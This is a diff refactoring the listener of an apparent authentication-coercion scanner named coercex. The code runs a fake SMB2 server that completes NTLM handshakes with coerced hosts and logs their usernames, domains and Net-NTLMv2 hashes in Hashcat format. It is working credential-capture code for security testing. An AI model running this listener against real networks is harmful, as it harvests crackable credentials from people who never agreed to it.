@@ -1,8 +1,8 @@
 """Async listener with correlation tokens and full SMB2 handshake.
 
 Provides an HTTP listener (for WebDAV callbacks) and an SMB listener
-that implements the complete SMB2 NEGOTIATE → SESSION_SETUP (NTLM
-Type 1/2/3) → TREE_CONNECT handshake to:
+that implements the complete SMB2 NEGOTIATE -> SESSION_SETUP (NTLM
+Type 1/2/3) -> TREE_CONNECT handshake to:
 
   1. **Reliably extract the correlation token** from the TREE_CONNECT
      share path (``\\\\host\\<token>``), solving the old IP-based FIFO
@@ -26,10 +26,31 @@ import asyncio
 import logging
 import os
 import socket
-import struct
 import time
 from datetime import datetime, timezone
 from dataclasses import dataclass
+
+from coercex.listener.ntlm import (
+    build_ntlm_challenge,
+    build_spnego_negotiate_token,
+    extract_spnego_ntlm_token,
+    parse_ntlm_type3,
+    wrap_ntlm_in_spnego_challenge,
+    wrap_spnego_accept_completed,
+)
+from coercex.listener.smb2 import (
+    _SMB1_MAGIC,
+    _SMB2_MAGIC,
+    _SMB2_SESSION_SETUP,
+    _SMB2_TREE_CONNECT,
+    _STATUS_MORE_PROCESSING_REQUIRED,
+    _STATUS_SUCCESS,
+    build_negotiate_response,
+    build_session_setup_response,
+    build_tree_connect_response,
+    recv_netbios,
+    send_netbios,
+)
 
 log = logging.getLogger("coercex.listener")
 
@@ -70,318 +91,12 @@ class AuthCallback:
     ntlmv2_hash: str = ""
 
 
-# ── NetBIOS / SMB2 framing helpers ──────────────────────────────────
-
-
-async def _recv_netbios(reader: asyncio.StreamReader, timeout: float = 5.0) -> bytes:
-    """Read one NetBIOS-framed SMB message.
-
-    4-byte NetBIOS header: 1 byte type (0x00) + 3 bytes big-endian length,
-    then *length* bytes of payload.
-    """
-    hdr = await asyncio.wait_for(reader.readexactly(4), timeout=timeout)
-    length = struct.unpack("!I", hdr)[0] & 0x00FFFFFF  # mask type byte
-    payload = await asyncio.wait_for(reader.readexactly(length), timeout=timeout)
-    return payload
-
-
-def _send_netbios(writer: asyncio.StreamWriter, payload: bytes) -> None:
-    """Send an SMB message with 4-byte NetBIOS framing."""
-    hdr = struct.pack("!I", len(payload))
-    writer.write(hdr + payload)
-
-
-# ── NTLM / SPNEGO builder helpers ──────────────────────────────────
-
-# These use impacket structs to build the server-side SMB2 handshake.
-
-_SMB2_MAGIC = b"\xfeSMB"
-_SMB1_MAGIC = b"\xffSMB"
-
-# SMB2 command codes
-_SMB2_NEGOTIATE = 0x0000
-_SMB2_SESSION_SETUP = 0x0001
-_SMB2_TREE_CONNECT = 0x0003
-
-# Status codes
-_STATUS_SUCCESS = 0x00000000
-_STATUS_MORE_PROCESSING_REQUIRED = 0xC0000016
-
-_SERVER_GUID = os.urandom(16)
-
-
-def _build_smb2_negotiate_response(msg_id: int, challenge_token: bytes) -> bytes:
-    """Build an SMB2 NEGOTIATE response with SPNEGO NegTokenInit.
-
-    *challenge_token* is the GSSAPI blob advertising NTLMSSP as a mechtype.
-    """
-    from impacket.smb3structs import (
-        SMB2_FLAGS_SERVER_TO_REDIR,
-        SMB2_DIALECT_002,
-        SMB2Packet,
-        SMB2Negotiate_Response,
-    )
-
-    resp = SMB2Packet()
-    resp["Flags"] = SMB2_FLAGS_SERVER_TO_REDIR
-    resp["Command"] = _SMB2_NEGOTIATE
-    resp["MessageID"] = msg_id
-    resp["SessionID"] = 0
-    resp["TreeID"] = 0
-    resp["Status"] = _STATUS_SUCCESS
-
-    body = SMB2Negotiate_Response()
-    body["SecurityMode"] = 1  # signing enabled (but not required)
-    body["DialectRevision"] = SMB2_DIALECT_002
-    body["ServerGuid"] = _SERVER_GUID
-    body["Capabilities"] = 0
-    body["MaxTransactSize"] = 65536
-    body["MaxReadSize"] = 65536
-    body["MaxWriteSize"] = 65536
-    body["SecurityBufferOffset"] = 0x80  # standard offset
-    body["SecurityBufferLength"] = len(challenge_token)
-    body["Buffer"] = challenge_token
-
-    resp["Data"] = body
-
-    return resp.getData()
-
-
-def _build_smb2_session_setup_response(
-    msg_id: int,
-    session_id: int,
-    ntlm_blob: bytes,
-    status: int = _STATUS_MORE_PROCESSING_REQUIRED,
-) -> bytes:
-    """Build an SMB2 SESSION_SETUP response wrapping an NTLM challenge/accept."""
-    from impacket.smb3structs import (
-        SMB2_FLAGS_SERVER_TO_REDIR,
-        SMB2Packet,
-        SMB2SessionSetup_Response,
-    )
-
-    resp = SMB2Packet()
-    resp["Flags"] = SMB2_FLAGS_SERVER_TO_REDIR
-    resp["Command"] = _SMB2_SESSION_SETUP
-    resp["MessageID"] = msg_id
-    resp["SessionID"] = session_id
-    resp["TreeID"] = 0
-    resp["Status"] = status
-
-    body = SMB2SessionSetup_Response()
-    body["SessionFlags"] = 0
-    body["SecurityBufferOffset"] = 0x48  # standard for session setup response
-    body["SecurityBufferLength"] = len(ntlm_blob)
-    body["Buffer"] = ntlm_blob
-
-    resp["Data"] = body
-
-    return resp.getData()
-
-
-def _build_smb2_tree_connect_response(
-    msg_id: int, session_id: int, tree_id: int
-) -> bytes:
-    """Build a minimal SMB2 TREE_CONNECT response (disk share)."""
-    from impacket.smb3structs import (
-        SMB2_FLAGS_SERVER_TO_REDIR,
-        SMB2Packet,
-        SMB2TreeConnect_Response,
-    )
-
-    resp = SMB2Packet()
-    resp["Flags"] = SMB2_FLAGS_SERVER_TO_REDIR
-    resp["Command"] = _SMB2_TREE_CONNECT
-    resp["MessageID"] = msg_id
-    resp["SessionID"] = session_id
-    resp["TreeID"] = tree_id
-    resp["Status"] = _STATUS_SUCCESS
-
-    body = SMB2TreeConnect_Response()
-    body["ShareType"] = 0x01  # SMB2_SHARE_TYPE_DISK
-    body["ShareFlags"] = 0
-    body["Capabilities"] = 0
-    body["MaximalAccess"] = 0x001F01FF  # GENERIC_ALL
-
-    resp["Data"] = body
-
-    return resp.getData()
-
-
-def _build_spnego_negotiate_token() -> bytes:
-    """Build the GSSAPI / SPNEGO NegTokenInit advertising NTLMSSP."""
-    from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
-
-    blob = SPNEGO_NegTokenInit()
-    blob["MechTypes"] = [
-        TypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]
-    ]
-    return blob.getData()
-
-
-def _build_ntlm_challenge(negotiate_flags: int, server_challenge: bytes) -> bytes:
-    """Build an NTLM Type 2 (CHALLENGE) message.
-
-    Returns the raw NTLMSSP blob (not SPNEGO-wrapped).
-    """
-    from impacket import ntlm
-
-    challenge = ntlm.NTLMAuthChallenge()
-
-    # Mirror flags the client wants, plus what we need
-    flags = negotiate_flags
-    flags |= (
-        ntlm.NTLMSSP_NEGOTIATE_56
-        | ntlm.NTLMSSP_NEGOTIATE_128
-        | ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH
-        | ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
-        | ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO
-        | ntlm.NTLMSSP_TARGET_TYPE_SERVER
-        | ntlm.NTLMSSP_NEGOTIATE_NTLM
-        | ntlm.NTLMSSP_REQUEST_TARGET
-        | ntlm.NTLMSSP_NEGOTIATE_UNICODE
-        | ntlm.NTLMSSP_NEGOTIATE_VERSION
-    )
-
-    challenge["flags"] = flags
-    challenge["challenge"] = server_challenge
-
-    # Domain / server names
-    domain = "COERCEX".encode("utf-16-le")
-    hostname = "SCANNER".encode("utf-16-le")
-
-    # Build target info (AV_PAIRS)
-    av_pairs = ntlm.AV_PAIRS()
-    av_pairs[ntlm.NTLMSSP_AV_HOSTNAME] = hostname
-    av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME] = domain
-    av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME] = "scanner.coercex.local".encode("utf-16-le")
-    av_pairs[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] = "coercex.local".encode("utf-16-le")
-    av_pairs_data = av_pairs.getData()
-
-    challenge["domain_name"] = domain
-    challenge["host_name"] = hostname
-    challenge["TargetInfoFields"] = av_pairs_data
-    challenge["TargetInfoFields_len"] = len(av_pairs_data)
-    challenge["TargetInfoFields_max_len"] = len(av_pairs_data)
-
-    # Version (8 bytes, use dummy)
-    challenge["Version"] = b"\xff" * 8
-    challenge["VersionLen"] = 8
-
-    # Offsets: fixed header is 56 bytes, then domain_name, then target_info
-    challenge["domain_offset"] = 56
-    challenge["host_offset"] = 56 + len(domain)
-    challenge["TargetInfoFields_offset"] = 56 + len(domain) + len(hostname)
-
-    return challenge.getData()
-
-
-def _wrap_ntlm_in_spnego_challenge(ntlm_challenge: bytes) -> bytes:
-    """Wrap an NTLM Type 2 in a SPNEGO NegTokenResp (accept-incomplete)."""
-    from impacket.spnego import SPNEGO_NegTokenResp, TypesMech
-
-    resp = SPNEGO_NegTokenResp()
-    resp["NegState"] = b"\x01"  # accept-incomplete
-    resp["SupportedMech"] = TypesMech[
-        "NTLMSSP - Microsoft NTLM Security Support Provider"
-    ]
-    resp["ResponseToken"] = ntlm_challenge
-    return resp.getData()
-
-
-def _wrap_spnego_accept_completed() -> bytes:
-    """Build SPNEGO NegTokenResp for final accept (SESSION_SETUP success)."""
-    from impacket.spnego import SPNEGO_NegTokenResp
-
-    resp = SPNEGO_NegTokenResp()
-    resp["NegState"] = b"\x00"  # accept-completed
-    return resp.getData()
-
-
-def _parse_ntlm_type3(
-    raw_token: bytes, server_challenge: bytes
-) -> tuple[str, str, str, str]:
-    """Parse NTLM Type 3 (AUTHENTICATE) and format Net-NTLMv2 hash.
-
-    Returns (username, domain, workstation, hash_string).
-    The hash_string is in Hashcat/John format:
-      ``USERNAME::DOMAIN:CHALLENGE:NTPROOFSTR:BLOB``
-    """
-    from impacket import ntlm
-
-    auth = ntlm.NTLMAuthChallengeResponse()
-    auth.fromString(raw_token)
-
-    username = auth["user_name"].decode("utf-16-le")
-    domain = auth["domain_name"].decode("utf-16-le")
-    workstation = auth["host_name"].decode("utf-16-le")
-
-    # Build the hash in John/Hashcat format
-    nt_response = auth["ntlm"]
-    lm_response = auth["lanman"]
-
-    hash_str = ""
-    if len(nt_response) > 24:
-        # NTLMv2: USERNAME::DOMAIN:SERVER_CHALLENGE:NT_PROOF_STR:BLOB
-        nt_proof_str = nt_response[:16]
-        blob = nt_response[16:]
-        hash_str = (
-            f"{username}::{domain}:"
-            f"{server_challenge.hex()}:"
-            f"{nt_proof_str.hex()}:"
-            f"{blob.hex()}"
-        )
-    elif len(nt_response) == 24:
-        # NTLMv1: USERNAME::DOMAIN:LM_RESPONSE:NT_RESPONSE:SERVER_CHALLENGE
-        hash_str = (
-            f"{username}::{domain}:"
-            f"{lm_response.hex()}:"
-            f"{nt_response.hex()}:"
-            f"{server_challenge.hex()}"
-        )
-
-    return username, domain, workstation, hash_str
-
-
-def _extract_spnego_ntlm_token(raw: bytes) -> bytes:
-    """Extract the raw NTLM token from a SPNEGO wrapper.
-
-    Handles both NegTokenInit (client's first message) and
-    NegTokenResp (client's second message with Type 3).
-    """
-    from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp
-
-    # Try NegTokenResp first (SESSION_SETUP #2, wraps Type 3)
-    try:
-        resp = SPNEGO_NegTokenResp(raw)
-        token = resp["ResponseToken"]
-        if token and len(token) > 0:
-            return bytes(token)
-    except Exception:
-        pass
-
-    # Try NegTokenInit (SESSION_SETUP #1, wraps Type 1)
-    try:
-        init = SPNEGO_NegTokenInit(raw)
-        token = init["MechToken"]
-        if token and len(token) > 0:
-            return bytes(token)
-    except Exception:
-        pass
-
-    # Raw NTLMSSP (no SPNEGO wrapper)
-    if raw[:7] == b"NTLMSSP":
-        return raw
-
-    raise ValueError("Could not extract NTLM token from SPNEGO blob")
-
-
 class AsyncListener:
     """Combined HTTP + SMB listener with token correlation and full SMB2 handshake.
 
     Primary correlation is **token-based**: the unique 12-char hex token
     embedded in UNC paths is extracted from the TREE_CONNECT share path
-    after completing a full SMB2 NEGOTIATE → SESSION_SETUP → TREE_CONNECT
+    after completing a full SMB2 NEGOTIATE -> SESSION_SETUP -> TREE_CONNECT
     handshake.
 
     Fallback is **IP-based (FIFO)**: when the handshake fails partway
@@ -414,13 +129,13 @@ class AsyncListener:
         self.enable_http = enable_http
         self.enable_smb = enable_smb
 
-        # Token → Future mapping (primary correlation)
+        # Token -> Future mapping (primary correlation)
         self._pending: dict[str, asyncio.Future[AuthCallback]] = {}
 
         # IP-based correlation index (fallback when token can't be extracted)
-        # target_ip → list of tokens in creation order (FIFO)
+        # target_ip -> list of tokens in creation order (FIFO)
         self._pending_by_ip: dict[str, list[str]] = {}
-        # token → target_ip (reverse index for cleanup)
+        # token -> target_ip (reverse index for cleanup)
         self._token_to_ip: dict[str, str] = {}
 
         # Timestamp-based callback log per source IP.
@@ -577,8 +292,6 @@ class AsyncListener:
                     continue
         return None
 
-    # ── HTTP Handler ────────────────────────────────────────────────────
-
     async def _handle_http(
         self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
     ) -> None:
@@ -620,7 +333,7 @@ class AsyncListener:
             if token:
                 self._resolve_token(token, callback)
             else:
-                # No token in path — fall back to IP-based correlation
+                # No token in path -- fall back to IP-based correlation
                 self._resolve_by_ip(src_ip, callback)
 
             # Send 401 to request NTLM auth (or just close)
@@ -642,15 +355,13 @@ class AsyncListener:
             except Exception:
                 pass
 
-    # ── SMB Handler ─────────────────────────────────────────────────────
-
     async def _handle_smb(
         self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
     ) -> None:
         """Handle incoming SMB connections with full SMB2 handshake.
 
-        Implements the complete SMB2 NEGOTIATE → SESSION_SETUP (NTLM
-        Type 1/2/3) → TREE_CONNECT flow.  This achieves:
+        Implements the complete SMB2 NEGOTIATE -> SESSION_SETUP (NTLM
+        Type 1/2/3) -> TREE_CONNECT flow.  This achieves:
 
         1. **Token-based correlation** via the share path in TREE_CONNECT
            (e.g. ``\\\\10.0.0.1\\abc123def456``).
@@ -678,15 +389,15 @@ class AsyncListener:
         server_challenge = os.urandom(8)
 
         try:
-            # ── Step 1: Receive NEGOTIATE ───────────────────────────────
-            raw = await _recv_netbios(reader, timeout=5.0)
+            # Step 1: Receive NEGOTIATE
+            raw = await recv_netbios(reader, timeout=5.0)
             if len(raw) < 4:
                 return
 
             # Determine SMB version from magic bytes
             magic = raw[:4]
             if magic == _SMB1_MAGIC:
-                # SMB1 NEGOTIATE — respond with SMB2 NEGOTIATE response
+                # SMB1 NEGOTIATE -- respond with SMB2 NEGOTIATE response
                 # to upgrade the client to SMB2
                 log.debug("SMB1 NEGOTIATE from %s, upgrading to SMB2", src_ip)
                 msg_id = 0
@@ -705,14 +416,14 @@ class AsyncListener:
                 self._ip_fallback_callback(src_ip, src_port, raw[:256])
                 return
 
-            # ── Step 2: Send NEGOTIATE response (SPNEGO w/ NTLMSSP) ────
-            spnego_init = _build_spnego_negotiate_token()
-            neg_resp = _build_smb2_negotiate_response(msg_id, spnego_init)
-            _send_netbios(writer, neg_resp)
+            # Step 2: Send NEGOTIATE response (SPNEGO w/ NTLMSSP)
+            spnego_init = build_spnego_negotiate_token()
+            neg_resp = build_negotiate_response(msg_id, spnego_init)
+            send_netbios(writer, neg_resp)
             await writer.drain()
 
-            # ── Step 3: Receive SESSION_SETUP #1 (NTLM Type 1) ────────
-            raw = await _recv_netbios(reader, timeout=5.0)
+            # Step 3: Receive SESSION_SETUP #1 (NTLM Type 1)
+            raw = await recv_netbios(reader, timeout=5.0)
             if len(raw) < 4 or raw[:4] != _SMB2_MAGIC:
                 self._ip_fallback_callback(src_ip, src_port, raw[:256])
                 return
@@ -742,7 +453,7 @@ class AsyncListener:
             # beginning of SMB2 header.
             sec_blob = raw[sec_buf_offset:][:sec_buf_len]
 
-            ntlm_type1 = _extract_spnego_ntlm_token(sec_blob)
+            ntlm_type1 = extract_spnego_ntlm_token(sec_blob)
             if ntlm_type1[:7] != b"NTLMSSP":
                 log.debug("No NTLMSSP in SESSION_SETUP #1 from %s", src_ip)
                 self._ip_fallback_callback(src_ip, src_port, raw[:256])
@@ -755,20 +466,22 @@ class AsyncListener:
             type1.fromString(ntlm_type1)
             negotiate_flags = type1["flags"]
 
-            # ── Step 4: Send SESSION_SETUP response (NTLM Type 2) ──────
-            ntlm_challenge = _build_ntlm_challenge(negotiate_flags, server_challenge)
-            spnego_challenge = _wrap_ntlm_in_spnego_challenge(ntlm_challenge)
-            sess_resp = _build_smb2_session_setup_response(
+            # Step 4: Send SESSION_SETUP response (NTLM Type 2)
+            ntlm_challenge_blob = build_ntlm_challenge(
+                negotiate_flags, server_challenge
+            )
+            spnego_challenge = wrap_ntlm_in_spnego_challenge(ntlm_challenge_blob)
+            sess_resp = build_session_setup_response(
                 msg_id=msg_id,
                 session_id=int.from_bytes(session_id, "little"),
                 ntlm_blob=spnego_challenge,
                 status=_STATUS_MORE_PROCESSING_REQUIRED,
             )
-            _send_netbios(writer, sess_resp)
+            send_netbios(writer, sess_resp)
             await writer.drain()
 
-            # ── Step 5: Receive SESSION_SETUP #2 (NTLM Type 3) ────────
-            raw = await _recv_netbios(reader, timeout=5.0)
+            # Step 5: Receive SESSION_SETUP #2 (NTLM Type 3)
+            raw = await recv_netbios(reader, timeout=5.0)
             if len(raw) < 4 or raw[:4] != _SMB2_MAGIC:
                 self._ip_fallback_callback(src_ip, src_port, raw[:256])
                 return
@@ -790,10 +503,10 @@ class AsyncListener:
             sec_buf_len = setup["SecurityBufferLength"]
             sec_blob = raw[sec_buf_offset:][:sec_buf_len]
 
-            ntlm_type3_raw = _extract_spnego_ntlm_token(sec_blob)
+            ntlm_type3_raw = extract_spnego_ntlm_token(sec_blob)
 
             # Parse Type 3 and extract credentials + hash
-            username, domain, workstation, ntlmv2_hash = _parse_ntlm_type3(
+            username, domain, workstation, ntlmv2_hash = parse_ntlm_type3(
                 ntlm_type3_raw, server_challenge
             )
             log.info(
@@ -806,21 +519,21 @@ class AsyncListener:
             if ntlmv2_hash:
                 log.info("Net-NTLMv2 hash: %s", ntlmv2_hash)
 
-            # ── Step 6: Send SESSION_SETUP success ─────────────────────
-            accept_blob = _wrap_spnego_accept_completed()
-            sess_success = _build_smb2_session_setup_response(
+            # Step 6: Send SESSION_SETUP success
+            accept_blob = wrap_spnego_accept_completed()
+            sess_success = build_session_setup_response(
                 msg_id=msg_id,
                 session_id=int.from_bytes(session_id, "little"),
                 ntlm_blob=accept_blob,
                 status=_STATUS_SUCCESS,
             )
-            _send_netbios(writer, sess_success)
+            send_netbios(writer, sess_success)
             await writer.drain()
 
-            # ── Step 7: Receive TREE_CONNECT ───────────────────────────
-            raw = await _recv_netbios(reader, timeout=5.0)
+            # Step 7: Receive TREE_CONNECT
+            raw = await recv_netbios(reader, timeout=5.0)
             if len(raw) < 4 or raw[:4] != _SMB2_MAGIC:
-                # No TREE_CONNECT — still resolve by IP + metadata
+                # No TREE_CONNECT -- still resolve by IP + metadata
                 log.debug("No TREE_CONNECT from %s, using IP fallback", src_ip)
                 callback = AuthCallback(
                     token="",
@@ -873,16 +586,16 @@ class AsyncListener:
 
             token = self._extract_token_from_path(unc_path)
 
-            # ── Step 8: Send TREE_CONNECT response ─────────────────────
-            tree_resp = _build_smb2_tree_connect_response(
+            # Step 8: Send TREE_CONNECT response
+            tree_resp = build_tree_connect_response(
                 msg_id=msg_id,
                 session_id=int.from_bytes(session_id, "little"),
                 tree_id=1,
             )
-            _send_netbios(writer, tree_resp)
+            send_netbios(writer, tree_resp)
             await writer.drain()
 
-            # ── Resolve the callback ───────────────────────────────────
+            # Resolve the callback
             callback = AuthCallback(
                 token=token or "",
                 source_ip=src_ip,
@@ -903,7 +616,7 @@ class AsyncListener:
 
         except (asyncio.TimeoutError, asyncio.IncompleteReadError):
             log.debug("SMB handshake timeout/incomplete from %s:%d", src_ip, src_port)
-            # Partial handshake — still resolve by IP if we can
+            # Partial handshake -- still resolve by IP if we can
             callback = AuthCallback(
                 token="",
                 source_ip=src_ip,
@@ -968,7 +681,7 @@ class AsyncListener:
 
         When token extraction from raw SMB data fails, we match the callback
         source IP against pending tokens registered for that target.  The
-        oldest (first-created) pending token is resolved — this gives
+        oldest (first-created) pending token is resolved -- this gives
         target-level VULNERABLE confirmation with a best-guess at which
         trigger actually caused the callback.
         """
@@ -976,7 +689,7 @@ class AsyncListener:
 
         token_list = self._pending_by_ip.get(src_ip)
         if not token_list:
-            log.info("SMB callback from %s — no pending tokens for this IP", src_ip)
+            log.info("SMB callback from %s -- no pending tokens for this IP", src_ip)
             return
 
         # Walk the FIFO list, find the first token whose future is still pending
@@ -984,7 +697,7 @@ class AsyncListener:
             token = token_list[0]
             future = self._pending.get(token)
             if future and not future.done():
-                # Found a live pending future — resolve it
+                # Found a live pending future -- resolve it
                 token_list.pop(0)
                 self._pending.pop(token, None)
                 self._token_to_ip.pop(token, None)
@@ -999,18 +712,18 @@ class AsyncListener:
                     del self._pending_by_ip[src_ip]
                 return
             else:
-                # Token already resolved/cancelled — skip it
+                # Token already resolved/cancelled -- skip it
                 token_list.pop(0)
                 self._token_to_ip.pop(token, None)
 
         # All tokens for this IP were already resolved/cancelled
         del self._pending_by_ip[src_ip]
-        log.info("SMB callback from %s — all pending tokens already resolved", src_ip)
+        log.info("SMB callback from %s -- all pending tokens already resolved", src_ip)
 
     def has_callback_since(self, target: str, since: float) -> bool:
         """Check if any callback arrived from *target* at or after *since*.
 
-        *target* can be a hostname or IP — it is resolved to an IP before
+        *target* can be a hostname or IP -- it is resolved to an IP before
         comparison.  *since* should be a ``time.monotonic()`` timestamp
         recorded **before** the coercion trigger was fired.
 
